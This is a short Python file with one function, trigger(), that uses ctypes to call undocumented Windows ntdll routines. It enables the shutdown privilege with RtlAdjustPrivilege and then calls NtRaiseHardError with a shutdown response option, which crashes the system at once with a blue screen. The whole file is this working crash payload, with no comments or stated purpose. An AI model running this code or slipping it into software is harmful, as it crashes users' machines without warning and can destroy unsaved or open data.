import ctypes

def trigger():
    state = ctypes.c_bool()
    response = ctypes.c_ulong()
    ntdll = ctypes.WinDLL("ntdll.dll")
    ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(state))
    ntdll.NtRaiseHardError(0xC0000006, 0, 0, None, 6, ctypes.byref(response))
    return response
